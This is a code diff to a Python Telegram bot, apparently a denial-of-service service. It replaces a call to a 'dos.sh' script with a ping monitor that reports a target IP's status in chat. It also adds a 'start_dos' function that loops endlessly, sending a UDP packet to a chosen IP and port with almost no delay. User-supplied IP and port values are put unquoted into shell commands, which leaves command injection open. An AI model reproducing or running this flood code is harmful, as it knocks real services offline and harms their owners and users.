@@ -1,26 +1,34 @@
 import asyncio
-import logging
 import os.path
 
 from aiogram.dispatcher.storage import FSMContextProxy
+from aiogram.types import Message
 
-import data
-from utils.misc.files import create_dirs
+from loader import dp
 
 
-async def start_dos(user_id: int, dos_data: FSMContextProxy):
-    users_data_path = os.path.dirname(os.path.abspath(data.users.__file__)) + f"/user_{user_id}/scripts/dos"
+async def get_timeout():
+    await asyncio.sleep(600)
+
+
+async def get_ping(message: Message, dos_data: FSMContextProxy):
     current_path = os.path.dirname(os.path.abspath(__file__))
-    cmd = f"sh '{current_path}/dos.sh' '{users_data_path}' {dos_data['ip']} {dos_data['port']} {dos_data['size']}"
-    create_dirs(users_data_path)
-    proc = await asyncio.create_subprocess_shell(
-        cmd=cmd,
-        stdout=asyncio.subprocess.PIPE,
-        stderr=asyncio.subprocess.PIPE
-    )
-    stdout, stderr = await proc.communicate()
-    logging.info(f'[{cmd!r} exited with {proc.returncode}]')
-    if stdout:
-        logging.info(f'[stdout]\n{stdout.decode()}')
-    if stderr:
-        logging.info(f'[stderr]\n{stderr.decode()}')
+    msg = await message.answer(f"Текущее состояние пакетов по данному IP-адресу:")
+    i = 0
+    while await dp.current_state().get_state() != 'DosState:stopped_script':
+        i += 1
+        cmd = f"sh '{current_path}/ping.sh' {dos_data['ip']}"
+        proc = await asyncio.create_subprocess_shell(
+            cmd=cmd,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
+        )
+        stdout, stderr = await proc.communicate()
+        await msg.edit_text(f"Текущее состояние пакетов по данному IP-адресу:\n{stdout.decode()}\n\n"
+                            f"Количество обновлений: {i}")
+
+
+async def start_dos(connect, ip: str, port: int, attack: bytes):
+    while True:
+        connect.sendto(attack, (ip, port))
+        await asyncio.sleep(0.000000000000001)
